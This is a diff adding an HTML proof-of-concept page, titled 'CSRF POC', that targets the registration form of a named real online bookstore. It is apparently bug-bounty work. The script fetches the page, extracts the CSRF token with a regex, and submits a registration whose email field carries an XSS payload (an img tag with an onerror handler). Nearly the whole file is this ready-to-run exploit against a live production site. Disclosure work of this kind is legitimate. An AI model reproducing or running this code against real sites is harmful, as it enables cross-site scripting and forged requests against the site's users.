@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>CSRF POC</title>
+    </head>
+    <body>
+        <script>
+            let csrfToken; // Global variable to store the CSRF token
+
+// Step 1: Send a GET request to obtain the CSRF token
+fetch('https://www.thalia.de/registrierung?timestamp=1693412108304&headless=true')
+  .then(response => response.text())
+  .then(data => {
+    const regex = /name="&#95;csrf" value="([^"]+)"/;
+    const match = data.match(regex);
+    if (match && match[1]) {
+      csrfToken = match[1];
+      console.log('CSRF token:', csrfToken);
+      
+      // Step 2: Prepare and send the POST request
+      const formData = new FormData();
+      formData.append('email', 'nb1b3k-ywh-f72fb34c3a37a3d7@yeswehack.ninja\'"><img src=x onshit=confirm(1) onerror=confirm`1`>asd</h1>');
+      formData.append('passwort', 'Test@123');
+      formData.append('geburtstagTag', '01');
+      formData.append('geburtstagMonat', '01');
+      formData.append('geburtstagJahr', '1991');
+      formData.append('agb', 'true');
+      formData.append('&#95;csrf', csrfToken);
+
+      fetch('https://www.thalia.de/registrierung?timestamp=1693412108304&headless=true', {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.text())
+      .then(result => {
+        console.log('POST request response:', result);
+        // Handle the response as needed
+      })
+      .catch(error => {
+        console.error('Error sending POST request:', error);
+      });
+    } else {
+      console.error('CSRF token not found in the response');
+    }
+  })
+  .catch(error => {
+    console.error('Error obtaining CSRF token:', error);
+  });
+
+        </script>
+    </body>
+</html>
